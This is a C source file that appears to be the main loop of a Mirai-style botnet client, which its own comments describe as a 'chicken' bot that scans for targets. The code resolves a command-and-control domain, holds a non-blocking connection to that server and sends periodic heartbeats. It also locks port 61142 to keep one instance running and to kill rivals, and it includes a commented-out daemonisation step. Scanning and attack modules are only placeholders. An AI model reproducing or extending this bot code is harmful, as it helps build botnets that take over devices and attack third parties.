#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "reslove.h"

/*botnet bin running chicken
 *occupation 61142 port to mark running status
 *auto scan the network to find the next target can be attacked
 *keep the connection with the CNC server
 */

static void ensure_single_instance(void);
static void establish_connection(void);

struct sockaddr_in srv_addr;
static int fd_ctrl = -1, fd_serv = -1;
static BOOL pending_connection = FALSE;

int main(int argc, char **args)
{
	int pgroupid;
	int selectcount = 0;
	srv_addr.sin_family = AF_INET;
	reslove_dns_lookup(CNC_DOMAIN, &srv_addr.sin_addr.s_addr);
	if (srv_addr.sin_addr.s_addr == 0)
	{
		printf("[main]Failed to reslove CNC_DOMAIN to address\n");	
		return -1;
	}
	else
	{
		printf("[main]CNC address:%s\n", inet_ntoa(srv_addr.sin_addr));	
	}
	srv_addr.sin_port = htons(CNC_PORT);	

	ensure_single_instance();

	/*become a deamon
	if (fork() > 0)
	{
		return 1;	
	}
	pgroupid = setsid();
	close(STDIN);
	close(STDOUT);
	close(STDERR);
	*/
	//initialization module here
	//
	//
	//
	while(TRUE)
	{
		fd_set fdread, fdwrite;
		struct timeval timeline;
		int mfd, nfds;
		
		//initilation fd_set
		FD_ZERO(&fdread);
		FD_ZERO(&fdwrite);

		//fd for accept
		if (fd_ctrl != -1)
		{
			FD_SET(fd_ctrl, &fdread);	
		}
		//fd for CNC
		if (fd_serv == -1)
		{
			establish_connection();
		}

		//if connect to CNC success, fd_serv will be have data to send to CNC; 
		//or fd_serv need to revice data from CNC;
		if (pending_connection)
		{
			//connect success, then send data;
			FD_SET(fd_serv, &fdwrite);	
		}
		else
		{
			//or waitting data from CNC;
			FD_SET(fd_serv, &fdread);	
		}
		if (fd_ctrl > fd_serv)
		{
			mfd = fd_ctrl;	
		}
		else
		{
			mfd = fd_serv;	
		}

		//timeout 10s
		timeline.tv_usec = 0;
		timeline.tv_sec = 10;
		//We do NOT care exception set
		nfds = select(mfd+1, &fdread, &fdwrite, NULL, &timeline);
		if (nfds == -1)
		{
			printf("[main]Select failed errno:%d\n", errno);	
			continue;
		}
		else if (nfds == 0)
		{
			int flag = 0;
			if ( selectcount++ % 10 == 0)
			{
				send(fd_serv, &flag, sizeof(flag), MSG_NOSIGNAL);	
			}
		}

	}

	return 0;
}

static void establish_connection()
{
	printf("[main]Start to connect to CNC\n");	
	fd_serv = socket(AF_INET, SOCK_STREAM, 0);
	if (fd_serv == -1)
	{
		printf("create socket failed, errorno:%d\n", errno);	
		return ;
	}
	fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
	pending_connection = TRUE;
	connect(fd_serv, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr_in));
}

static void ensure_single_instance(void)
{
	//just a struct
	struct sockaddr_in addr;
	struct sockaddr_in addrclient;
	int opt = 1;
	int ret;
	BOOL bind_OK = TRUE;
	socklen_t socklength = sizeof(addrclient);
	
	fd_ctrl = socket(AF_INET, SOCK_STREAM, 0);
	if (fd_ctrl == -1)
	{
		return ;	
	}

	//set socket option -> address can be reused;
	setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
	//make socket NOBLOCK;
	fcntl(fd_ctrl, F_SETFL, O_NONBLOCK|fcntl(fd_ctrl, F_GETFL, 0));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = LOCAL_ADDR;
	addr.sin_port = htons(SINGLE_INSTANCE_PORT);

	errno = 0;
	ret = bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

	if (ret == -1)
	{
		if (errno == EADDRNOTAVAIL)
		{
			bind_OK = FALSE;	
		}
		printf("[main] Another instance is already running (errno = %d), try to kill itself\n", errno);	

		//restore the struct
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = INADDR_ANY;
		addr.sin_port = htons(SINGLE_INSTANCE_PORT);
		
		ret = connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
		if (ret == -1)
		{
			printf("[main] Failed to connect to fd_ctrl, try to kill itself\n");			
		}
		sleep(3);
		close(fd_ctrl);
		//kill process request here;

		//try again to start listen on SINGLE_INSTANCES_PORT
		ensure_single_instance();
	}
	else
	{
		ret = listen(fd_ctrl, 1);
		if (ret  == -1)
		{
			printf("[main]Failed to listen on fd_ctrl, I will be try again!\n");	
			close(fd_ctrl);
			sleep(3);
			//kill another process which take up that port
			//try again
			ensure_single_instance();
		}
		bind_OK = TRUE;
		printf("[main]There are only one instance running on this machine port:%d\n", ntohs(addr.sin_port));
	}
}
